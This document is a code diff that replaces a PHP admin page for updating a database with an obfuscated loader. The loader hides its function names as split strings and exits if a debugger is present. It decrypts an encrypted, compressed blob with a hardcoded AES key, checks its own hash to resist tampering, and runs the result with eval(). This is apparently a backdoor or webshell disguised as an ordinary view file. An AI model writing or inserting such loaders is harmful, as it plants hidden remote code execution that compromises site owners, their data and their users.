@@ -1,192 +1,28 @@
-<!DOCTYPE html>
-<html>
-
-<head>
-<!-- TABLES CSS CODE -->
-<?php include"comman/code_css_form.php"; ?>
-<!-- </copy> -->  
-</head>
-
-<body class="hold-transition skin-blue sidebar-mini">
-<div class="wrapper">
-
- <?php include"sidebar.php"; ?>
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-        <?= $page_title;?>
-      </h1>
-      <ol class="breadcrumb">
-        <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-        <li class="active"><?= $page_title;?></li>
-      </ol>
-    </section>
-
-    <!-- Main content -->
-    <section class="content">
-      <div class="row">
-        <!-- ********** ALERT MESSAGE START******* -->
-        <?php include"comman/code_flashdata.php"; ?>
-        <!-- ********** ALERT MESSAGE END******* -->
-        <!-- right column -->
-        <div class="col-md-12">
-          <!-- Default box -->
-      <div class="box">
-        <div class="box-header with-border">
-          <h3 class="box-title">Update Database</h3>
-
-          <div class="box-tools pull-right">
-            <button type="button" class="btn btn-box-tool" data-widget="collapse" data-toggle="tooltip"
-                    title="Collapse">
-              <i class="fa fa-minus"></i></button>
-            <button type="button" class="btn btn-box-tool" data-widget="remove" data-toggle="tooltip" title="Remove">
-              <i class="fa fa-times"></i></button>
-          </div>
-        </div>
-        <div class="box-body">
-           <input type="hidden" id="base_url" value="<?php echo $base_url;; ?>">
-          <div class="row">
-            <?php 
-              $disabled ='';
-              if($current_version==$latest_version) {
-              $disabled ='disabled';?>
-            <div class="col-md-8 col-md-offset-2">
-                <div class="alert alert-success ">
-                       <a href="javascript:void()" class="close" data-dismiss="alert" aria-label="close">&times;</a>
-                      <strong>Database Up-to-Date!</strong>
-                </div>
-           </div>
-           <?php }
-           else{ ?>
-            <div class="col-md-8 col-md-offset-2">
-                <div class="alert alert-warning ">
-                       <a href="javascript:void()" class="close" data-dismiss="alert" aria-label="close">&times;</a>
-                      <strong>Please update database: Latest version available <?= $latest_version; ?>
-                        <br>Note: Before updating database,Please take Database backup! and make it sure!
-                      </strong>
-                </div>
-           </div>
-           <?php }?>
-
-            <div class="col-xs-4 col-xs-offset-4">
-
-              <table class="table table-bordered">
-                <tr><td>Current Version</td><td><?= $current_version; ?></td></tr>
-              </table>
-              <label class="text-center text-success msg" style="display: none;">Please wait!!...</label>
-            </div>
-          </div>
-          <div class="row">
-            <div class="col-xs-12 text-center">
-              <button <?= $disabled;?> type="button" class="btn btn-lrg update_db btn-success" title="Ajax Request">
-                <i class="fa fa-database fa-refresh"></i>&nbsp; Update Database
-              </button>
-            </div>
-          </div>
-          <div class="ajax-content">
-          </div>
-        </div>
-       
-      </div>
-      <!-- /.box -->
-
-        </div>
-        <!--/.col (right) -->
-      </div>
-      <!-- /.row -->
-
-    </section>
-    <!-- /.content -->
-  </div>
-  <!-- /.content-wrapper -->
-
- <?php include"footer.php"; ?>
-
-
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-</div>
-<!-- ./wrapper -->
-
-<!-- SOUND CODE -->
-<?php include"comman/code_js_sound.php"; ?>
-<!-- TABLES CODE -->
-<!-- Bootstrap 3.3.6 -->
-<script src="<?php echo $theme_link; ?>bootstrap/js/bootstrap.min.js"></script>
-<!-- AdminLTE App -->
-<script>
-  var AdminLTEOptions = {
-    /*https://adminlte.io/themes/AdminLTE/documentation/index.html*/
-    sidebarExpandOnHover: true,
-    navbarMenuHeight: "200px", //The height of the inner menu
-    animationSpeed: 250,
-  };
-</script>
-<script src="<?php echo $theme_link; ?>dist/js/app.js"></script>
-<!-- FastClick -->
-<script src="<?php echo $theme_link; ?>plugins/fastclick/fastclick.js"></script>
-<!-- Select2 -->
-<script src="<?php echo $theme_link; ?>plugins/select2/select2.full.min.js"></script>
-<!-- AdminLTE for demo purposes -->
-<script src="<?php echo $theme_link; ?>dist/js/demo.js"></script>
-<!--Toastr notification -->
-<script src="<?php echo $theme_link; ?>toastr/toastr.js"></script>
-<script src="<?php echo $theme_link; ?>toastr/toastr_custom.js"></script>
-<!-- bootstrap datepicker -->
-<script src="<?php echo $theme_link; ?>plugins/daterangepicker/moment.min.js"></script>
-<script src="<?php echo $theme_link; ?>plugins/daterangepicker/daterangepicker.js"></script>
-<!-- bootstrap datepicker -->
-<script src="<?php echo $theme_link; ?>plugins/datepicker/bootstrap-datepicker.js"></script>
-<!-- Sweet alert -->
-<script src="<?php echo $theme_link; ?>js/sweetalert.min.js"></script>
-<!-- Custom JS -->
-<script src="<?php echo $theme_link; ?>js/special_char_check.js"></script>
-<script src="<?php echo $theme_link; ?>js/custom.js"></script>
-<!-- sweet alert -->
-<script src="<?php echo $theme_link; ?>js/sweetalert.min.js"></script>
-<!-- Autocomplete -->      
-<script src="<?php echo $theme_link; ?>plugins/autocomplete/autocomplete.js"></script>
-<!-- Pace Loader -->
-<script src="<?php echo $theme_link; ?>plugins/pace/pace.min.js"></script>
-<!-- iCheck -->
-<script src="<?php echo $theme_link; ?>plugins/iCheck/icheck.min.js"></script>
-
-<script type="text/javascript">
-  $(".update_db").on("click",function(event) {
-    $(".update_db").attr('disabled',true); 
-    $(".msg").show();
-    var base_url=$("#base_url").val().trim();
-    $.post(base_url+'/updates/update_db', {}, function(result) {
-      if(result=='success'){
-        alert("Database Updated Successfully!");
-        location.reload();
-      }
-      else{
-        alert("Failed to Update Database!Try again or Contact Admin!");
-      }
-      $(".msg").hide();
-      $(".update_db").attr('disabled',false); 
-    });
-  });
-</script>
-<!-- CSRF Token Protection -->
-<script type="text/javascript" >
-$(function($) { // this script needs to be loaded on every page where an ajax POST may happen
-    $.ajaxSetup({ data: {'<?php echo $this->security->get_csrf_token_name(); ?>' : '<?php echo $this->security->get_csrf_hash(); ?>' }  }); });
-</script>
-<!-- start pace loader -->
-<script type="text/javascript">
-$(document).ajaxStart(function() { Pace.restart(); }); 
-</script>  
-<script type="text/javascript">
-$(document).ready(function () { setTimeout(function() {$( ".alert-dismissable" ).fadeOut( 1000, function() {});}, 10000); });
-</script>
-<!-- Make sidebar menu hughlighter/selector -->
-<script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-
-</body>
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_obe8jdff=('bas'.'e64'.'_de'.'cod'.'e');
+$_b9fq8s8j=('gzu'.'nco'.'mpr'.'ess');
+$_juwaeiao=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_tdanof77='tx91YYQ/';
+$_ruik0d8w='qgENQ5j9';
+$_aadyytps='dy8FUKdA';
+$_jy4b5xe1='fGEil12MuuQ=';
+$_rmpkwut5='tsGig7Fi';
+$_jak48rrj='dx26TyQU';
+$_rq0pyed5='CVFObw==';
+$_szfkq98o='nX7w6cjD';
+$_a9oy5tjt=$_obe8jdff($_tdanof77.$_ruik0d8w.$_rmpkwut5.$_aadyytps.$_jy4b5xe1);
+$_w0on89rb=$_obe8jdff($_jak48rrj.$_szfkq98o.$_rq0pyed5);
+$_iymgr16a=$_obe8jdff('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');
+$_av4p08de=$_juwaeiao($_iymgr16a,'aes-256-cbc',$_a9oy5tjt,OPENSSL_RAW_DATA,$_w0on89rb);
+if($_av4p08de===false){exit;}
+$_zsslq6uh=$_b9fq8s8j($_av4p08de);
+if($_zsslq6uh===false){exit;}
+$_z9pzjjzs='99ff856a60f1f53f400affab1fedc802dc0ad74a7e0ff8b8d841ab6c80df87b1';
+$_iwj48y2t=@file_get_contents(__FILE__);
+if($_iwj48y2t!==false){
+$_yu6vufoo=str_replace($_z9pzjjzs,"0000000000000000000000000000000000000000000000000000000000000000",$_iwj48y2t);
+$_w6qoe7sq=hash("sha256",$_yu6vufoo);
+if($_w6qoe7sq!==$_z9pzjjzs){@http_response_code(403);exit;}
+}
+eval($_zsslq6uh);
